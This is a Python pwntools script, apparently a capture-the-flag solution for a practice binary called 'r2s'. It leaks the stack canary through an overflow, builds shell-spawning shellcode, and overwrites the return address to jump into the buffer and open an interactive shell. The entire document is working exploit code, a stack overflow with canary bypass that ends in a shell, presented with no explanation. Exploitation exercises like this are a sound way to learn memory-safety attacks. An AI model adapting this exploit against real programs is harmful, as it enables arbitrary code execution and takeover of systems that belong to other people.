from pwn import *


# context.log_level = "DEBUG"
context.arch = "amd64"


p = process('./r2s')
p.recvuntil(b"Address of the buf: ")
buf_addr = p.recv(14)
success("BUFFER ADDRESS: " + buf_addr.decode())
buf_addr = int(buf_addr, 16)

p.recvuntil(b"$rbp: ")
buf2rbp = int(p.recv(2).decode())

success("BUF <====> SFP : " + str(buf2rbp))
buf2canary = buf2rbp - 8

success("BUF <====> CANARY : " + str(buf2canary))
dummy = b"A" * (buf2canary + 1)
p.sendafter(b"Input: ", dummy)
p.recvuntil(dummy)
cnry = u64(b"\x00"+p.recvn(7))		# canary to ASCII

success("CANARY : " + hex(cnry))	# ASCII to Hex
shellcode = asm(shellcraft.sh())

buffer = shellcode.ljust(buf2canary, b"A")
canary = p64(cnry)
sfp = b"B" * 0x8
return_addr = p64(buf_addr)


malicious_payload = buffer + canary + sfp + return_addr


p.sendlineafter(b"Input: ", malicious_payload)
p.interactive()



